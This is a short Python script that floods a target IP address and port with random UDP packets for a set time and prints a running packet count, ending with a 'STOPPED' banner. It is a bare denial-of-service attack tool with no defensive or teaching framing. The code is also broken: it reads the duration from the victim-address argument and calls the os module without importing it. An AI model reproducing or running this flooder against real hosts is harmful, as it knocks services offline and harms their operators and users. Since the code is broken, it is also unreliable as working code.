import time, sys, socket, random

victim = str(sys.argv[1])
vport = int(sys.argv[2])
duration = int(sys.argv[1])

def flood(victim, vport, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    pack = random._urandom(1024)
    timeout =  time.time() + duration
    sent = 0

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        client.sendto(pack, (victim, vport))
        sent = sent + 1
        print("Sent {} packets, to ip {} and throught port {}".format(sent, victim, vport))

if __name__ == '__main__':
    try:
        flood(victim, vport, duration)
    except KeyboardInterrupt:
        os.system('cls' if os.name == 'nt' else 'clear')
        print ("\033[95m╔════════════════════════════════════╗")
        print ("\033[95m         ╔═╗╔╦╗╔═╗╔═\u001b[31m╗╔═╗╔═╗╔╦╗        ")
        print ("\033[95m         ╚═╗ ║ ║ ║╠═╝╠\u001b[31m═╝║╣  ║║        ")
        print ("\033[95m         ╚═╝ ╩ ╚═╝╩  ╩  \u001b[31m╚═╝═╩╝        ")
        print ("\033[95m╚════════════════════════════════════╝")
